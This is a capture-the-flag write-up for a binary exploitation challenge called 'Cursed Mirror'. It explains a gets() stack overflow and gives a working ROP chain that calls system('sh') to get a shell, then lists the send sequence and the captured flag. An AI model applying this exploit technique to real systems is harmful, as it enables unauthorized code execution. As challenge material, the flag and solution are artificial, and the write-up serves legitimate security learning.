# Cursed Mirror — PWN (150 pts)

Remote: 159.65.228.107:5003. Menu-driven binary; option 2 is where it breaks.

## How I solved it

Menu option 2 calls `question()`, which does `gets()` into a 0x40 buffer — again 72 bytes to saved RIP, no PIE, no canary. No win function this time, so I went for `system("sh")`.

There's a hint in the binary: the "glimpses" strings are stored reversed — string8 = `/bin/sh`, string9 = `/home/hackerman/supersecretfile.txt` (the actual flag file on the server turned out to be `./secretflag.txt`, so a shell was the way).

ROP chain — write "sh" into unused .data with `gets()`, then call `system()` on it:

```python
payload  = b"A"*72
payload += p64(0x401da5)   # pop rdi; ret
payload += p64(0x406150)   # unused .data
payload += p64(0x4010e0)   # gets@plt  -> type "sh"
payload += p64(0x401da5)   # pop rdi; ret
payload += p64(0x406150)
payload += p64(0x401080)   # system@plt
```

Send the payload, then a newline (for the menu's getchar), then `sh` for the gets() stage-2, then `cat secretflag.txt`.

## Flag

```
deadface{M1RR0R_R1M}
```
